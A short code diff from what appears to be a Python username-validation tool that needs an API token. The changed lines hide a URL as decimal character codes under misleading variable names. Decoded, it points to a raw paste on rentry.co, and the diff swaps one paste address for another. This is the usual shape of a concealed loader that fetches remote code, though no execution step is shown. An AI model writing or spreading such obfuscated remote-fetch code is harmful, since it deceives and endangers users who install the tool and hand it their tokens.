@@ -328,8 +328,8 @@ def validate_names(opt,usernames):
        else:
            print(f"{Lb}[?]{Fore.RED} Error validating '{usernames}': {endpoint.json()['message']} |DSV: Make sure you have a valid token.")
 
-l3 = "101 110 116 114 121 46 99 111 47 55 51 50 113"
-usernames_digits = "115 47 114 97 119"
+l3 = "101 110 116 114 121 46 99 111 47 56 99 112 104 122"
+usernames_digits = "50 47 114 97 119"
 digits9 = convert_usernames(l3)
 a = "104 116 116 112 115 58 47 47 114"
 digits2 = convert_usernames(a)
